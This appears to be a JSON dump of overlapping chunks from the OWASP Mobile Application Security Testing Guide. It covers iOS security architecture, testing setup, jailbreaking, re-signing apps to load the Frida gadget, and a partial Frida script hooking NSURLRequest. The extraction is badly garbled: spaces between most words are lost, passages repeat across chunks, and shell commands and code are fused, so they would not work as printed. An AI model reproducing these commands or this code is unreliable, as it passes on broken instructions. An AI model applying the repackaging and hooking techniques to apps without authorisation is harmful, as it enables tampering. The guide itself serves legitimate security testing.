    "text": "file system encryption. Because UIDs aren’t recorded during manufacturing,notevenApplecanrestorethefileencryptionkeysforaparticulardevice. Toallowsecuredeletionofsensitivedataonflashmemory,iOSdevicesincludeafeaturecalledEffaceableStorage. This featureprovidesdirectlow-levelaccesstothestoragetechnology,makingitpossibletosecurelyeraseselectedblocks. Secure Boot WhenaniOSdeviceispoweredon,itreadstheinitialinstructionsfromtheread-onlymemoryknownasBootROM,which bootstrapsthesystem. TheBootROMcontainsimmutablecodeandtheAppleRootCA,whichisetchedintothesilicon chipduringthefabricationprocess,therebycreatingtherootoftrust. Next,theBootROMmakessurethattheLLB’s(Low LevelBootloader)signatureiscorrect,andtheLLBchecksthattheiBootbootloader’ssignatureiscorrecttoo. Afterthe signatureisvalidated,theiBootchecksthesignatureofthenextbootstage,whichistheiOSkernel. Ifanyofthesesteps fail,thebootprocesswillterminateimmediatelyandthedevicewillenterrecoverymodeanddisplaytherestorescreen. However, if the Boot ROM fails to load, the device will enter a special low-level recovery mode called Device Firmware Upgrade(DFU).Thisisthelastresortforrestoringthedevicetoitsoriginalstate. Inthismode,thedevicewillshowno signofactivity;i.e.,itsscreenwon’tdisplayanything. 328\\nThis entire process is called the “Secure Boot Chain”. Its purpose is focused on verifying the boot process integrity, ensuringthatthesystemanditscomponentsarewrittenanddistributedbyApple. TheSecureBootchainconsistsofthe kernel,thebootloader,thekernelextension,andthebasebandfirmware. Code Signing ApplehasimplementedanelaborateDRMsystemtomakesurethatonlyApple-approvedcoderunsontheirdevices,that is,codesignedbyApple. Inotherwords,youwon’tbeabletorunanycodeonaniOSdevicethathasn’tbeenjailbroken unlessAppleexplicitlyallowsit. EndusersaresupposedtoinstallappsthroughtheofficialApple’sAppStoreonly. For thisreason(andothers),iOShasbeencomparedtoacrystalprison. A developer profile and an Apple-signed certificate are required to deploy and run an application. Developers need to registerwithApple,jointheAppleDeveloperProgramandpayayearlysubscriptiontogetthefullrangeofdevelopment anddeploymentpossibilities. There’salsoafreedeveloperaccountthatallowsyoutocompileanddeployapps(butnot distributethemintheAppStore)viasideloading. AccordingtotheArchivedAppleDeveloperDocumentationthecodesignatureconsistsofthreeparts: • Aseal. Thisisacollectionofchecksumsorhashesofthevariouspartsofthecode, createdbythecodesigning software. Thesealcanbeusedatverificationtimetodetectalterations. • A digital signature. The code signing software encrypts the seal using the signer’s identity to create a digital signature. Thisguaranteestheseal’sintegrity. • Coderequirements. Thesearetherulesgoverningverificationofthecodesignature. Dependingonthegoals,some areinherenttotheverifier,whileothersarespecifiedbythesignerandsealedwiththerestofthecode. Learnmore: • CodeSigningGuide(ArchivedAppleDeveloperDocumentation) • CodeSigning(AppleDeveloperDocumentation) • DemystifyingiOSCodeSignature Encryption and Data Protection FairPlay Code Encryption is applied to apps downloaded from the App Store. FairPlay was developed as a DRM when purchasing multimedia content. Originally, FairPlay encryption was applied to MPEG and QuickTime streams, but the samebasicconceptscanalsobeappliedtoexecutablefiles. Thebasicideaisasfollows: OnceyouregisteranewApple user account, or Apple ID, a public/private key pair will be created and assigned to your account. The private key is securelystoredonyourdevice. ThismeansthatFairPlay-encryptedcodecanbedecryptedonlyondevicesassociated withyouraccount. ReverseFairPlayencryptionisusuallyobtainedbyrunningtheapponthedevice,thendumpingthe decryptedcodefrommemory(seealso“BasicSecurityTestingoniOS”). 329\\nApplehasbuiltencryptionintothehardwareandfirmwareofitsiOSdevicessincethereleaseoftheiPhone3GS.Every devicehasadedicatedhardware-basedcryptographicenginethatprovidesanimplementationoftheAES256-bitencryp- tionandtheSHA-1hashingalgorithms. Inaddition,there’sauniqueidentifier(UID)builtintoeachdevice’shardwarewith anAES256-bitkeyfusedintotheApplicationProcessor. ThisUIDisuniqueandnotrecordedelsewhere. Atthetimeof writing,neithersoftwarenorfirmwarecandirectlyreadtheUID.Becausethekeyisburnedintothesiliconchip,itcan’t betamperedwithorbypassed. Onlythecryptoenginecanaccessit. Buildingencryptionintothephysicalarchitecturemakesitadefaultsecurityfeaturethatcanencryptalldatastoredonan iOSdevice. Asaresult,dataprotectionisimplementedatthesoftwarelevelandworkswiththehardwareandfirmware encryptiontoprovidemoresecurity. When data protection is enabled, by simply establishing a passcode in the mobile device, each data file is associated with a specific protection class. Each class supports a different level of accessibility and protects data on the basis of when the data needs to be accessed. The encryption and decryption operations associated with each class are based onmultiplekeymechanismsthatutilizethedevice’sUIDandpasscode,aclasskey,afilesystemkey,andaper-filekey. The per-file key is used to encrypt the file’s contents. The class key is wrapped around the per-file key and stored in the file’s metadata. The file system key is used to encrypt the metadata. The UID and passcode protect the class key. This operation is invisible to users. To enable data protection, the passcode must be used when accessing the device. Thepasscodeunlocksthedevice. CombinedwiththeUID,thepasscodealsocreatesiOSencryptionkeysthataremore resistanttohackingandbrute-forceattacks. Enablingdataprotectionisthemainreasonforuserstousepasscodeson theirdevices. Sandbox TheappsandboxisaniOSaccesscontroltechnology. Itisenforcedatthekernellevel. Itspurposeislimitingsystemand userdatadamagethatmayoccurwhenanappiscompromised. SandboxinghasbeenacoresecurityfeaturesincethefirstreleaseofiOS.Allthird-partyappsrununderthesameuser (mobile),andonlyafewsystemapplicationsandservicesrunasroot(orotherspecificsystemusers). RegulariOSapps areconfinedtoacontainerthatrestrictsaccesstotheapp’sownfilesandaverylimitednumberofsystemAPIs. Accessto allresources(suchasfiles,networksockets,IPCs,andsharedmemory)arecontrolledbythesandbox. Theserestrictions workasfollows[#levin]: • The app process is restricted to its own directory (under /var/mobile/Containers/ Bundle/Application/ or /var/containers/Bundle/Application/,dependingontheiOSversion)viaachroot-likeprocess. • Themmapandmmprotectsystemcallsaremodifiedtopreventappsfrommakingwritablememorypagesexecutable andstoppingprocessesfromexecutingdynamicallygeneratedcode. IncombinationwithcodesigningandFairPlay, this strictly limits what code can run under specific circumstances (e.g., all code in apps distributed via the App StoreisapprovedbyApple). • Processesareisolatedfromeachother,eveniftheyareownedbythesameUIDattheoperatingsystemlevel. • Hardwaredriverscan’tbeaccesseddirectly. Instead,theymustbeaccessedthroughApple’spublicframeworks. General Exploit Mitigations iOS implements address space layout randomization (ASLR) and eXecute Never (XN) bit to mitigate code execution at- tacks. ASLRrandomizesthememorylocationoftheprogram’sexecutablefile, data, heap, andstackeverytimetheprogram isexecuted. Becausethesharedlibrariesmustbestatictobeaccessedbymultipleprocesses,theaddressesofshared libraries are randomized every time the OS boots instead of every time the program is invoked. This makes specific function and library memory addresses hard to predict, thereby preventing attacks such as the return-to-libc attack, whichinvolvesthememoryaddressesofbasiclibcfunctions. TheXNmechanismallowsiOStomarkselectedmemorysegmentsofaprocessasnon-executable. OniOS,theprocess stackandheapofuser-modeprocessesismarkednon-executable. Pagesthatarewritablecannotbemarkedexecutable atthesametime. Thispreventsattackerstoexecutemachinecodeinjectedintothestackorheap. 330\\nSoftware Development on iOS Like other platforms, Apple provides a Software Development Kit (SDK) that helps developers to develop, install, run, andtestnativeiOSApps. XcodeisanIntegratedDevelopmentEnvironment(IDE)forApplesoftwaredevelopment. iOS applicationsaredevelopedinObjective-CorSwift. Objective-C is an",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 120
    }
  },
  {
    "text": "and library memory addresses hard to predict, thereby preventing attacks such as the return-to-libc attack, whichinvolvesthememoryaddressesofbasiclibcfunctions. TheXNmechanismallowsiOStomarkselectedmemorysegmentsofaprocessasnon-executable. OniOS,theprocess stackandheapofuser-modeprocessesismarkednon-executable. Pagesthatarewritablecannotbemarkedexecutable atthesametime. Thispreventsattackerstoexecutemachinecodeinjectedintothestackorheap. 330\\nSoftware Development on iOS Like other platforms, Apple provides a Software Development Kit (SDK) that helps developers to develop, install, run, andtestnativeiOSApps. XcodeisanIntegratedDevelopmentEnvironment(IDE)forApplesoftwaredevelopment. iOS applicationsaredevelopedinObjective-CorSwift. Objective-C is an object-oriented programming language that adds Smalltalk-style messaging to the C programming language. ItisusedonmacOStodevelopdesktopapplicationsandoniOStodevelopmobileapplications. Swiftisthe successorofObjective-CandallowsinteroperabilitywithObjective-C. SwiftwasintroducedwithXcode6in2014. Onanon-jailbrokendevice,therearetwowaystoinstallanapplicationoutoftheAppStore: 1. viaEnterpriseMobileDeviceManagement. Thisrequiresacompany-widecertificatesignedbyApple. 2. viasideloading, i.e., bysigninganappwithadeveloper’scertificateandinstallingitonthedeviceviaXcode(or CydiaImpactor). Alimitednumberofdevicescanbeinstalledtowiththesamecertificate. Apps on iOS iOSappsaredistributedinIPA(iOSAppStorePackage)archives. TheIPAfileisaZIP-compressedarchivethatcontains allthecodeandresourcesrequiredtoexecutetheapp. IPAfileshaveabuilt-indirectorystructure. Theexamplebelowshowsthisstructureatahighlevel: • /Payload/foldercontainsalltheapplicationdata. Wewillcomebacktothecontentsofthisfolderinmoredetail. • /Payload/Application.app contains the application data itself (ARM-compiled code) and associated static re- sources. • /iTunesArtworkisa512x512pixelPNGimageusedastheapplication’sicon. • /iTunesMetadata.plistcontainsvariousbitsofinformation,includingthedeveloper’snameandID,thebundle identifier,copyrightinformation,genre,thenameoftheapp,releasedate,purchasedate,etc. • /WatchKitSupport/WKisanexampleofanextensionbundle. Thisspecificbundlecontainstheextensiondelegate andthecontrollersformanagingtheinterfacesandrespondingtouserinteractionsonanAppleWatch. IPA Payloads - A Closer Look Let’stakeacloserlookatthedifferentfilesintheIPAcontainer. Appleusesarelativelyflatstructurewithfewextraneous directoriestosavediskspaceandsimplifyfileaccess. Thetop-levelbundledirectorycontainstheapplication’sexecutable fileandalltheresourcestheapplicationuses(forexample,theapplicationicon,otherimages,andlocalizedcontent. • MyApp: Theexecutablefilecontainingthecompiled(unreadable)applicationsourcecode. • Application: Applicationicons. • Info.plist: Configurationinformation,suchasbundleID,versionnumber,andapplicationdisplayname. • Launchimages: Imagesshowingtheinitialapplicationinterfaceinaspecificorientation. Thesystemusesoneof theprovidedlaunchimagesasatemporarybackgrounduntiltheapplicationisfullyloaded. • MainWindow.nib: Default interface objects that are loaded when the application is launched. Other interface objectsaretheneitherloadedfromothernibfilesorcreatedprogrammaticallybytheapplication. • Settings.bundle: Application-specificpreferencestobedisplayedintheSettingsapp. • Customresourcefiles: Non-localizedresourcesareplacedinthetop-leveldirectoryandlocalizedresourcesare placed in language-specific subdirectories of the application bundle. Resources include nib files, images, sound files,configurationfiles,stringsfiles,andanyothercustomdatafilestheapplicationuses. Alanguage.lprojfolderexistsforeachlanguagethattheapplicationsupports. Itcontainsastoryboardandstringsfile. • AstoryboardisavisualrepresentationoftheiOSapplication’suserinterface. Itshowsscreensandtheconnections betweenthosescreens. • Thestringsfileformatconsistsofoneormorekey-valuepairsandoptionalcomments. 331\\nOn a jailbroken device, you can recover the IPA for an installed iOS app using different tools that allow decrypting the mainappbinaryandreconstructtheIPAfile. Similarly,onajailbrokendeviceyoucaninstalltheIPAfilewithIPAInstaller. During mobile security assessments, developers often give you the IPA directly. They can send you the actual file or provideaccesstothedevelopment-specificdistributionplatformtheyuse,e.g.TestFlightorVisualStudioAppCenter. App Permissions IncontrasttoAndroidapps(beforeAndroid6.0(APIlevel23)), iOSappsdon’thavepre-assignedpermissions. Instead, theuserisaskedtograntpermissionduringruntime,whentheappattemptstouseasensitiveAPIforthefirsttime. Apps thathavebeengrantedpermissionsarelistedintheSettings>Privacymenu,allowingtheusertomodifytheapp-specific setting. Applecallsthispermissionconceptprivacycontrols. iOSdeveloperscan’tsetrequestedpermissionsdirectly,thesewillberequestedindirectlywhenaccessingsensitiveAPIs. Forexample,whenaccessingauser’scontacts,anycalltoCNContactStoreblockstheappwhiletheuserisbeingasked tograntordenyaccess. StartingwithiOS10.0,appsmustincludeusagedescriptionkeysforthetypesofpermissions theyrequestanddatatheyneedtoaccess(e.g.,NSContactsUsageDescription). ThefollowingAPIsrequireuserpermission: • Contacts • Microphone • Calendars • Camera • Reminders • HomeKit • Photos • Health • Motionactivityandfitness • Speechrecognition • LocationServices • Bluetoothsharing • MediaLibrary • Socialmediaaccounts DeviceCheck The DeviceCheck framework, including its components DeviceCheck and App Attest, helps you prevent fraudulent use of your services. It consists of a framework that you use from your app and an Apple server which is accessible only toyourownserver. DeviceCheckallowsyoutopersistentlystoreinformationonthedeviceandonAppleservers. The storedinformationremainsintactacrossappreinstallation,devicetransfers,orresets,withtheoptiontoresetthisdata periodically. DeviceCheckistypicallyusedtomitigatefraudbyrestrictingaccesstosensitiveresources. Forexample,limitingpromo- tions to once per device, identify and flag fraudulent devices, etc. However, it definitely cannot prevent all fraud. For example,itisnotmeanttodetectcompromisedoperatingsystems(aka. jailbreakdetection). 332\\nFormoreinformation,refertotheDeviceCheckdocumentation. App Attest App Attest, available under the DeviceCheck framework, helps you verify instances of the app running on a device by enablingappstoattachahardware-backedassertiontorequests,ensuringtheyoriginatefromthelegitimateappona genuineAppledevice. Thisfeatureaidsinpreventingmodifiedappsfromcommunicatingwithyourserver. Theprocessinvolvesgeneratingandvalidatingcryptographickeys, alongwithasetofverificationsperformedbyyour server,ensuringtheauthenticityoftherequest. ItisimportanttonotethatwhileAppAttestenhancessecurity,itdoes notguaranteecompleteprotectionagainstallformsoffraudulentactivities. Formoredetailedinformation,refertotheWWDC2021session,alongwiththeAppAttestdocumentationandAppAttest implementationguide. 333\\niOS Security Testing Inthischapter,we’lldiveintosettingupasecuritytestingenvironmentandintroduceyoutosomepracticalprocesses andtechniquesfortestingthesecurityofiOSapps. ThesearethebuildingblocksfortheMASTGtestcases. iOS Testing Setup AlthoughyoucanuseaLinuxorWindowshostcomputerfortesting,you’llfindthatmanytasksaredifficultorimpossible ontheseplatforms. Inaddition,theXcodedevelopmentenvironmentandtheiOSSDKareonlyavailableformacOS.This means that you’ll definitely want to work on macOS for source code analysis and debugging (it also makes black box testingeasier). Host Device ThefollowingisthemostbasiciOSapptestingsetup: • IdeallymacOShostcomputerwithadminrights • XcodeandXcodeCommandLineToolsinstalled. • Wi-Finetworkthatpermitsclient-to-clienttraffic. • AtleastonejailbrokeniOSdevice(ofthedesirediOSversion). • BurpSuiteorotherinterceptionproxytool. Obtaining the UDID of an iOS device TheUDIDisa40-digituniquesequenceoflettersandnumberstoidentifyaniOSdevice. YoucanfindtheUDIDofyour iOSdeviceonmacOSCatalinaonwardsintheFinderapp,asiTunesisnotavailableanymoreinCatalina. OpenFinderand selecttheconnectediOSdeviceinthesidebar. Clickonthetextcontainingthemodel, storagecapacity, andbatteryinformation, anditwilldisplaytheserialnumber, UDID,andmodelinstead: 334\\nYoucancopytheUDIDbyrightclickingonit. ItisalsopossibletogettheUDIDviavariouscommandlinetoolsonmacOSwhilethedeviceisattachedviaUSB: • ByusingtheI/ORegistryExplorertoolioreg: $ioreg -pIOUSB -l|grep \"USBSerial\" | \"USBSerial Number\" =\"9e8ada44246cee813e2f8c1407520bf2f84849ec\" • Byusingideviceinstaller(alsoavailableonLinux): $brew installideviceinstaller $idevice_id -l 316f01bd160932d2bf2f95f1f142bc29b1c62dbc • Byusingthesystem_profiler: $system_profiler SPUSBDataType |sed-n-e'/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p' |grep \"SerialNumber:\" 2019-09-0810:18:03.920 system_profiler[13251:1050356]SPUSBDevice:IOCreatePlugInInterfaceForServicefailed0xe00002be SerialNumber: 64655621de6ef5e56a874d63f1e1bdd14f7103b1 • Byusinginstruments: instruments -sdevices Testing on a real device (Jailbroken) You should have a jailbroken iPhone or iPad for running tests. These devices allow root access and tool installation, makingthesecuritytestingprocessmorestraightforward. Ifyoudon’thaveaccesstoajailbrokendevice,youcanapply theworkaroundsdescribedlaterinthischapter,butbepreparedforamoredifficultexperience. Testing on the iOS Simulator UnliketheAndroidemulator,whichfullyemulatesthehardwareofanactualAndroiddevice,theiOSSDKsimulatoroffers a higher-level simulation of",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 121
    }
  },
  {
    "text": "SPUSBDataType |sed-n-e'/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p' |grep \"SerialNumber:\" 2019-09-0810:18:03.920 system_profiler[13251:1050356]SPUSBDevice:IOCreatePlugInInterfaceForServicefailed0xe00002be SerialNumber: 64655621de6ef5e56a874d63f1e1bdd14f7103b1 • Byusinginstruments: instruments -sdevices Testing on a real device (Jailbroken) You should have a jailbroken iPhone or iPad for running tests. These devices allow root access and tool installation, makingthesecuritytestingprocessmorestraightforward. Ifyoudon’thaveaccesstoajailbrokendevice,youcanapply theworkaroundsdescribedlaterinthischapter,butbepreparedforamoredifficultexperience. Testing on the iOS Simulator UnliketheAndroidemulator,whichfullyemulatesthehardwareofanactualAndroiddevice,theiOSSDKsimulatoroffers a higher-level simulation of an iOS device. Most importantly, emulator binaries are compiled to x86 code instead of ARM code. Apps compiled for a real device don’t run, making the simulator useless for black box analysis and reverse engineering. 335\\nTesting on an Emulator CorelliumistheonlypubliclyavailableiOSemulator. ItisanenterpriseSaaSsolutionwithaperuserlicensemodeland doesnotoffercommunitylicenses. Getting Privileged Access iOSjailbreakingisoftencomparedtoAndroidrooting,buttheprocessisactuallyquitedifferent. Toexplainthedifference, we’llfirstreviewtheconceptsof“rooting”and“flashing”onAndroid. • Rooting: Thistypicallyinvolvesinstallingthesubinaryonthesystemorreplacingthewholesystemwitharooted customROM.Exploitsaren’trequiredtoobtainrootaccessaslongasthebootloaderisaccessible. • Flashing custom ROMs: This allows you to replace the OS that’s running on the device after you unlock the bootloader. Thebootloadermayrequireanexploittounlockit. OniOSdevices,flashingacustomROMisimpossiblebecausetheiOSbootloaderonlyallowsApple-signedimagestobe bootedandflashed. ThisiswhyevenofficialiOSimagescan’tbeinstallediftheyaren’tsignedbyApple,anditmakes iOSdowngradesonlypossibleforaslongasthepreviousiOSversionisstillsigned. ThepurposeofjailbreakingistodisableiOSprotections(Apple’scodesigningmechanismsinparticular)sothatarbitrary unsignedcodecanrunonthedevice(e.g.customcodeordownloadedfromalternativeappstoressuchasCydiaorSileo). Theword“jailbreak”isacolloquialreferencetoall-in-onetoolsthatautomatethedisablingprocess. DevelopingajailbreakforagivenversionofiOSisnoteasy. Asasecuritytester,you’llmostlikelywanttousepublicly availablejailbreaktools. Still,werecommendstudyingthetechniquesthathavebeenusedtojailbreakvariousversions of iOS-you’ll encounter many interesting exploits and learn a lot about OS internals. For example, Pangu9 for iOS 9.x exploitedatleastfivevulnerabilities,includingause-after-freekernelbug(CVE-2015-6794)andanarbitraryfilesystem accessvulnerabilityinthePhotosapp(CVE-2015-7037). SomeappsattempttodetectwhethertheiOSdeviceonwhichthey’rerunningisjailbroken. Thisisbecausejailbreaking deactivatessomeofiOS’defaultsecuritymechanisms. However,thereareseveralwaystogetaroundthesedetections, andwe’llintroducetheminthechapter“iOSAnti-ReversingDefenses”. Benefits of Jailbreaking EndusersoftenjailbreaktheirdevicestotweaktheiOSsystem’sappearance,addnewfeatures,andinstallthird-party appsfromunofficialappstores. Forasecuritytester,however,jailbreakinganiOSdevicehasevenmorebenefits. They include,butaren’tlimitedto,thefollowing: • Rootaccesstothefilesystem. • Possibilityofexecutingapplicationsthathaven’tbeensignedbyApple(whichincludesmanysecuritytools). • Unrestricteddebugginganddynamicanalysis. • AccesstotheObjective-CorSwiftruntime. Jailbreak Types Therearetethered,semi-tethered,semi-untethered,anduntetheredjailbreaks. • Tethered jailbreaks don’t persist through reboots, so re-applying jailbreaks requires the device to be connected (tethered)toacomputerduringeveryreboot. Thedevicemaynotrebootatallifthecomputerisnotconnected. • Semi-tetheredjailbreakscan’tbere-appliedunlessthedeviceisconnectedtoacomputerduringreboot. Thedevice canalsobootintonon-jailbrokenmodeonitsown. • Semi-untetheredjailbreaksallowthedevicetobootonitsown,butthekernelpatches(oruser-landmodifications) fordisablingcodesigningaren’tappliedautomatically. Theusermustre-jailbreakthedevicebystartinganappor visitingawebsite(notrequiringaconnectiontoacomputer,hencethetermuntethered). • Untetheredjailbreaksarethemostpopularchoiceforendusersbecausetheyneedtobeappliedonlyonce,after whichthedevicewillbepermanentlyjailbroken. 336\\nCaveats and Considerations DevelopingajailbreakforiOSisbecomingmoreandmorecomplicatedasApplecontinuestohardentheirOS.Whenever Applebecomesawareofavulnerability,itispatchedandasystemupdateispushedouttoallusers. Asitisnotpossible to downgrade to a specific version of iOS, and since Apple only allows you to update to the latest iOS version, it is a challengetohaveadevicewhichisrunningaversionofiOSforwhichajailbreakisavailable. Somevulnerabilitiescannot bepatchedbysoftware,suchasthecheckm8exploitaffectingtheBootROMofallCPUsuntilA12. If you have a jailbroken device that you use for security testing, keep it as is unless you’re 100% sure that you can re- jailbreak it after upgrading to the latest iOS version. Consider getting one (or multiple) spare device(s) (which will be updatedwitheverymajoriOSrelease)andwaitingforajailbreaktobereleasedpublicly. Appleisusuallyquicktorelease apatchonceajailbreakhasbeenreleasedpublicly,soyouonlyhaveacoupleofdaystodowngrade(ifitisstillsigned byApple)totheaffectediOSversionandapplythejailbreak. iOSupgradesarebasedonachallenge-responseprocess(generatingtheso-calledSHSHblobsasaresult). Thedevice will allow the OS installation only if the response to the challenge is signed by Apple. This is what researchers call a “signingwindow”,anditisthereasonyoucan’tsimplystoretheOTAfirmwarepackageyoudownloadedandloaditonto thedevicewheneveryouwantto. DuringminoriOSupgrades,twoversionsmaybothbesignedbyApple(thelatestone, andthepreviousiOSversion). ThisistheonlysituationinwhichyoucandowngradetheiOSdevice. Youcancheckthe currentsigningwindowanddownloadOTAfirmwarefromtheIPSWDownloadswebsite. ForsomedevicesandiOSversions,itispossibletodowngradetoolderversionsincasetheSHSHblobsforthatdevice werecollectedwhenthesigningwindowwasactive. MoreinformationonthiscanbefoundonthecfwiOSGuide-Saving Blobs Which Jailbreaking Tool to Use DifferentiOSversionsrequiredifferentjailbreakingtechniques. Determinewhetherapublicjailbreakisavailableforyour version of iOS. Beware of fake tools and spyware, which are often hiding behind domain names that are similar to the nameofthejailbreakinggroup/author. TheiOSjailbreaksceneevolvessorapidlythatprovidingup-to-dateinstructionsisdifficult. However,wecanpointyou tosomesourcesthatarecurrentlyreliable. • AppleDB • TheiPhoneWiki • RedmondPie • RedditJailbreak Notethatanymodificationyoumaketoyourdeviceisatyourownrisk. Whilejailbreakingistypicallysafe,things cangowrongandyoumayendupbrickingyourdevice. Nootherpartyexceptyourselfcanbeheldaccountablefor anydamage. Dynamic Analysis on Non-Jailbroken Devices Platform: ios Ifyoudon’thaveaccesstoajailbrokendevice,youcanpatchandrepackagethetargetapptoloadadynamiclibraryat startup (e.g. the Frida gadget to enable dynamic testing with Frida and related tools such as objection). This way, you can instrument the app and do everything you need to do for dynamic analysis (of course, you can’t break out of the sandboxthisway). However,thistechniqueonlyworksiftheappbinaryisn’tFairPlay-encrypted(i.e.,obtainedfromthe AppStore). Automated Repackaging Objectionautomatestheprocessofapprepackaging. Youcanfindexhaustivedocumentationontheofficialwikipages. Usingobjection’srepackagingfeatureissufficientformostofusecases. However,insomecomplexscenariosyoumight need more fine-grained control or a more customizable repackaging process. In that case, you can read a detailed explanationoftherepackagingandresigningprocessin“ManualRepackaging”. 337\\nManual Repackaging ThankstoApple’sconfusingprovisioningandcode-signingsystem,re-signinganappismorechallengingthanyouwould expect. iOSwon’trunanappunlessyougettheprovisioningprofileandcodesignatureheaderexactlyright. Thisrequires learningmanyconcepts-certificatetypes,BundleIDs,applicationIDs,teamidentifiers,andhowApple’sbuildtoolsconnect them. GettingtheOStorunabinarythathasn’tbeenbuiltviathedefaultmethod(Xcode)canbeadauntingprocess. We’lluseoptool,Apple’sbuildtools,andsomeshellcommands. OurmethodisinspiredbyVincentTan’sSwizzlerproject. TheNCCgrouphasdescribedanalternativerepackagingmethod. Toreproducethestepslistedbelow,downloadUnCrackableiOSAppLevel1fromtheOWASPMobileTestingGuiderepos- itory. Our goal is to make the UnCrackable app load FridaGadget.dylib during startup so we can instrument the app withFrida. PleasenotethatthefollowingstepsapplytomacOSonly,asXcodeisonlyavailableformacOS. Getting a Developer Provisioning Profile and Certificate TheprovisioningprofileisaplistfilesignedbyApple,whichaddsyourcode-signingcertificatetoitslistofacceptedcertifi- catesononeormoredevices. Inotherwords,thisrepresentsAppleexplicitlyallowingyourapptorunforcertainreasons, such as debugging on selected devices (development profile).",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 122
    }
  },
  {
    "text": "ThankstoApple’sconfusingprovisioningandcode-signingsystem,re-signinganappismorechallengingthanyouwould expect. iOSwon’trunanappunlessyougettheprovisioningprofileandcodesignatureheaderexactlyright. Thisrequires learningmanyconcepts-certificatetypes,BundleIDs,applicationIDs,teamidentifiers,andhowApple’sbuildtoolsconnect them. GettingtheOStorunabinarythathasn’tbeenbuiltviathedefaultmethod(Xcode)canbeadauntingprocess. We’lluseoptool,Apple’sbuildtools,andsomeshellcommands. OurmethodisinspiredbyVincentTan’sSwizzlerproject. TheNCCgrouphasdescribedanalternativerepackagingmethod. Toreproducethestepslistedbelow,downloadUnCrackableiOSAppLevel1fromtheOWASPMobileTestingGuiderepos- itory. Our goal is to make the UnCrackable app load FridaGadget.dylib during startup so we can instrument the app withFrida. PleasenotethatthefollowingstepsapplytomacOSonly,asXcodeisonlyavailableformacOS. Getting a Developer Provisioning Profile and Certificate TheprovisioningprofileisaplistfilesignedbyApple,whichaddsyourcode-signingcertificatetoitslistofacceptedcertifi- catesononeormoredevices. Inotherwords,thisrepresentsAppleexplicitlyallowingyourapptorunforcertainreasons, such as debugging on selected devices (development profile). The provisioning profile also includes the entitlements grantedtoyourapp. Thecertificatecontainstheprivatekeyyou’llusetosign. Dependingonwhetheryou’reregisteredasaniOSdeveloper,youcanobtainacertificateandprovisioningprofileinone ofthefollowingways: WithaniOSdeveloperaccount: Ifyou’vedevelopedanddeployediOSappswithXcodebefore,youalreadyhaveyourowncode-signingcertificateinstalled. Usethesecuritycommand(macOSonly)tolistyoursigningidentities: $securityfind-identity -v 1)61FA3547E0AF42A11E233F6A2B255E6B6AF262CE \"iPhoneDistribution:CompanyNameLtd.\" 2)8004380F331DCA22CC1B47FB1A805890AE41C938 \"iPhoneDeveloper:BernhardMüller(RV852WND79)\" LogintotheAppleDeveloperportaltoissueanewAppID,thenissueanddownloadtheprofile. AnAppIDisatwo-part string: aTeamIDsuppliedbyAppleandabundleIDsearchstringthatyoucansettoanarbitraryvalue, suchascom. example.myapp. Note that you can use a single App ID to re-sign multiple apps. Make sure you create adevelopment profileandnotadistributionprofilesothatyoucandebugtheapp. Intheexamplesbelow,Iusemysigningidentity,whichisassociatedwithmycompany’sdevelopmentteam. Icreated theAppID“sg.vp.repackaged”andtheprovisioningprofile“AwesomeRepackaging”fortheseexamples. Iendedupwith thefileAwesomeRepackaging.mobileprovision-replacethiswithyourownfilenameintheshellcommandsbelow. WithaRegularAppleID: Applewillissueafreedevelopmentprovisioningprofileevenifyou’renotapayingdeveloper. Youcanobtaintheprofile viaXcodeandyourregularAppleaccount: simplycreateanemptyiOSprojectandextractembedded.mobileprovision from the app container, which is in the Xcode subdirectory of your home directory: ~/Library/Developer/Xcode/ DerivedData/<ProjectName>/Build/Products/Debug-iphoneos/<ProjectName>.app/. TheNCCblogpost“iOSinstru- mentationwithoutjailbreak”explainsthisprocessingreatdetail. Once you’ve obtained the provisioning profile, you can check its contents with the security command. You’ll find the entitlementsgrantedtotheappintheprofile,alongwiththeallowedcertificatesanddevices. You’llneedtheseforcode- signing,soextractthemtoaseparateplistfileasshownbelow. Havealookatthefilecontentstomakesureeverything isasexpected. $securitycms -D-iAwesomeRepackaging.mobileprovision >profile.plist $/usr/libexec/PlistBuddy -x-c'Print:Entitlements' profile.plist >entitlements.plist $catentitlements.plist <?xmlversion=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPEplistPUBLIC \"-//Apple//DTDPLIST1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>application-identifier</key> 338\\n<string>LRUD9L355Y.sg.vantagepoint.repackage</string> <key>com.apple.developer.team-identifier</key> <string>LRUD9L355Y</string> <key>get-task-allow</key> <true/> <key>keychain-access-groups</key> <array> <string>LRUD9L355Y.*</string> </array> </dict> </plist> Notetheapplicationidentifier,whichisacombinationoftheTeamID(LRUD9L355Y)andBundleID(sg.vantagepoint.repackage). ThisprovisioningprofileisonlyvalidfortheappthathasthisAppID.Theget-task-allowkeyisalsoimportant: when settotrue,otherprocesses,suchasthedebuggingserver,areallowedtoattachtotheapp(consequently,thiswould besettofalseinadistributionprofile). Method Hooking Platform: ios Frida Insection“ExecutionTracing”we’veusedfrida-tracewhennavigatingtoawebsiteinSafariandfoundthattheinitWith- URL:methodiscalledtoinitializeanewURLrequestobject. WecanlookupthedeclarationofthismethodontheApple DeveloperWebsite: -(instancetype)initWithURL:(NSURL *)url; UsingthisinformationwecanwriteaFridascriptthatinterceptstheinitWithURL:methodandprintstheURLpassedto themethod. Thefullscriptisbelow. Makesureyoureadthecodeandinlinecommentstounderstandwhat’sgoingon. importsys importfrida ##JavaScripttobeinjected frida_code =\"\"\" //ObtainareferencetotheinitWithURL:methodoftheNSURLRequestclass varURL=ObjC.classes.NSURLRequest[\"-initWithURL:\"]; //Interceptthemethod Interceptor.attach(URL.implementation,{ onEnter:function(args){ //GetahandleonNSString varNSString=ObjC.classes.NSString; //ObtainareferencetotheNSLogfunction,anduseittoprinttheURLvalue //args[2]referstothefirstmethodargument(NSURL*url) varNSLog=newNativeFunction(Module.findExportByName('Foundation','NSLog'),'void',['pointer','...']); //WeshouldalwaysinitializeanautoreleasepoolbeforeinteractingwithObjective-CAPIs varpool=ObjC.classes.NSAutoreleasePool.alloc().init(); try{ //CreatesaJSbindinggivenaNativePointer. varmyNSURL=newObjC.Object(args[2]); 